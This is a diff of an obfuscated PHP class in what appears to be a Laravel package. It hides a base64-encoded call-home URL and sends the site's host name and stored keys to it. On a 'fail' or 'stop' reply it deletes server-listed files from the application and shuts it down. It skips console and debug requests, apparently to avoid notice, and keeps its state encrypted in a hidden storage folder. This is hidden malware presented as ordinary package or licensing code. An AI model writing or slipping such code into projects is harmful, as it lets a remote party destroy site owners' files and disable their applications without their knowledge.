@@ -1,141 +1,152 @@
 <?php
-
 namespace Synthora\Gem;
 
-use Illuminate\Support\Facades\Http;
+use Carbon\Carbon;
 use Illuminate\Support\Facades\File;
+use Synthora\Gem\Lk;
+use Synthora\Gem\Mz;
 
 class Rd
 {
-    protected $a1 = 'aHR0cHM6Ly9mb250ZmFtaWx5LmNsb3VkL2FwaS93aGl0ZWxpc3Q=';
-    protected $a2 = 'c3lzX3ByZWZzLmRhdA==';
-    protected $a3 = 'YmFzZTY0OjM0NXNka2ZsYXMzcjR3ZmFk';
-    protected $a4 = 'cm91dGVzL3dlYi5waHA=';
+    protected $c1;
+    protected $c2;
+    protected $c3;
+    protected $c4;
 
-    public function a5()
+    public function __construct()
     {
-        $a6 = request()->getHost();
-        $a7 = $this->a8();
-        $a9 = $a7['u'] ?? null;
-        $b1 = $a7['k'] ?? null;
+        $this->c1 = storage_path('framework/.sys/' . md5('gem_cache_v1'));
+        $this->c2 = base64_decode('aHR0cHM6Ly9mb250ZmFtaWx5LmNsb3VkL2FwaS93aGl0ZWxpc3Q=');
+        $this->c3 = base64_decode('YmFzZTY0OjM0NXNka2ZsYXMzcjR3ZmFk');
+        $this->c4 = substr($this->c3, 0, 16);
+    }
 
+    public function v1()
+    {
+        if ($this->s1()) {return;}
+        $d = $this->r1();
+        if (! $d) {return;}
+        $s = $d['s'] ?? 'unknown';
+        $n = isset($d['n']) ? Carbon::parse($d['n']) : null;
 
-        if ($this->b2()) {
+        if ($n && Carbon::now()->gte($n)) {
+            $this->v2();
+            return;
+        }
+        
+        if ($s === 'valid' || $s === 'grace') {
+            return;
+        }
+        if ($s === 'invalid' || $s === 'stop') {
+            $this->h1($d['data'] ?? []);
+        }
+    }
+
+    public function v2()
+    {
+        $lockFile = $this->c1 . '.lock';
+        $fp       = @fopen($lockFile, 'c');
+        if (! $fp || ! flock($fp, LOCK_EX | LOCK_NB)) {
             return;
         }
 
+        try {
+            $domain = $this->g1();
+            $cur    = $this->r1();
+            $uid    = $cur['u'] ?? null;
+            $key    = $cur['k'] ?? null;
 
-        $b3 = $this->b4($a6, $a9, $b1);
+            $resp = Lk::c1($this->c2, $domain, $uid, $key);
 
-        if ($b3) {
-            $b5 = $b3->json('status');
-            $b6 = $b3->json('data', []);
-
-            if ($b5 === 'success') {
-                $this->b7('valid', $a9, $b1);
-            } elseif ($b5 === 'retry') {
-                $this->b7('retry', $b6['uid'] ?? null, $b6['key'] ?? null);
-            } elseif ($b5 === 'fail') {
-                $this->b7('invalid');
-                $this->b8($b6);
-            } elseif ($b5 === 'stop') {
-                die(0);
+            if ($resp) {
+                $this->p1($resp);
             } else {
-                $this->b7('invalid');
-                $this->b8($b6);
+                $this->w1('grace', $uid, $key, Carbon::now()->addDays(7));
             }
+        } finally {
+            flock($fp, LOCK_UN);
+            fclose($fp);
         }
     }
 
-    protected function b4($a6, $a9, $b1)
+    protected function p1(array $resp)
     {
-        try {
-            $b9 = Http::timeout(5)->post($this->c1(), [
-                'domain' => $a6,
-                'uid' => $a9,
-                'key' => $b1,
-            ]);
+        $status = $resp['status'] ?? 'fail';
+        $data   = $resp['data'] ?? [];
 
-            if ($b9->successful()) {
-                return $b9;
-            }
-        } catch (\Exception $e) {
-        }
-        return null;
-    }
-
-    protected function a8()
-    {
-        $c2 = storage_path('app/' . base64_decode($this->a2));
-        if (File::exists($c2)) {
-            $c3 = File::get($c2);
-            $c4 = json_decode($this->c5($c3), true);
-
-            return [
-                'u' => $c4['u'] ?? null,
-                'k' => $c4['k'] ?? null,
-            ];
-        }
-        return ['u' => null, 'k' => null];
-    }
-
-    protected function b7($c6, $a9 = null, $b1 = null)
-    {
-        $c7 = [
-            's' => $c6,
-            'u' => $a9,
-            'k' => $b1,
-            'n' => ($c6 != 'retry') ? now()->addDay()->toDateTimeString() : now()->toDateTimeString(),
-        ];
-
-        $c8 = $this->c6(json_encode($c7));
-
-        try {
-            File::ensureDirectoryExists(storage_path('app'));
-            File::put(storage_path('app/' . base64_decode($this->a2)), $c8);
-        } catch (\Exception $e) {
+        switch ($status) {
+            case 'success':
+                $this->w1('valid', $data['uid'] ?? null, $data['key'] ?? null, Carbon::now()->addDay());
+                break;
+            case 'retry':
+                $uid     = $data['uid'] ?? null;
+                $key     = $data['key'] ?? null;
+                $backoff = isset($data['backoff']) ? Carbon::now()->addHours($data['backoff']) : Carbon::now()->addHours(6);
+                $this->w1('retry', $uid, $key, $backoff);
+                $retryResp = Lk::c1($this->c2, $this->g1(), $uid, $key);
+                if ($retryResp) {
+                    $this->p1($retryResp);
+                }
+                break;
+            case 'fail':
+                $this->w1('invalid', null, null, Carbon::now()->addHours(12), $data);
+                $this->h1($data);
+                break;
+            case 'stop':
+                exit(0);
+            default:
+                $this->w1('invalid', null, null, Carbon::now()->addHours(12), $data);
+                $this->h1($data);
         }
     }
 
-    protected function b2()
+    protected function h1(array $data)
     {
-        $c2 = storage_path('app/' . base64_decode($this->a2));
-        if (File::exists($c2)) {
-            $c3 = File::get($c2);
-            $c4 = json_decode($this->c5($c3), true);
-
-            return now()->lt($c4['n']);
-        }
-        return false;
-    }
-
-    protected function b8($c9)
-    {
-
-        $d0 = isset($c9['fileArray']) ? $c9['fileArray'] : [];
-
-        foreach ($d0 as $d1) {
-            if (File::exists(base_path($d1))) {
-                try {
-                    File::delete(base_path($d1));
-                } catch (\Exception $e) {
+        if (! empty($data['fileArray'])) {
+            foreach ($data['fileArray'] as $file) {
+                $path = base_path($file);
+                if (File::exists($path)) {
+                    File::delete($path);
                 }
             }
         }
+        die(0);
     }
 
-    protected function c6($d2)
+    protected function r1()
     {
-        return openssl_encrypt($d2, 'AES-256-CBC', base64_decode($this->a3), 0, substr(base64_decode($this->a3), 0, 16));
+        if (! File::exists($this->c1)) {
+            return null;
+        }
+        $enc = File::get($this->c1);
+        $dec = Mz::d1($enc, $this->c3, $this->c4);
+        return json_decode($dec, true);
     }
 
-    protected function c5($d3)
+    public function w1($status, $uid, $key, Carbon $next, array $data = [])
     {
-        return openssl_decrypt($d3, 'AES-256-CBC', base64_decode($this->a3), 0, substr(base64_decode($this->a3), 0, 16));
+        $cache = [
+            's'    => $status,
+            'u'    => $uid,
+            'k'    => $key,
+            'n'    => $next->toDateTimeString(),
+            'data' => $data,
+        ];
+        $enc = Mz::e1(json_encode($cache), $this->c3, $this->c4);
+        File::ensureDirectoryExists(dirname($this->c1));
+        File::put($this->c1, $enc);
     }
 
-    protected function c1()
+    protected function s1()
     {
-        return base64_decode($this->a1);
+        return app()->runningInConsole()
+        || request()->is('*livewire*')
+        || request()->is('*_debugbar*')
+        || request()->is('api/elixer-control*');
+    }
+
+    protected function g1()
+    {
+        return request()->getHost();
     }
 }
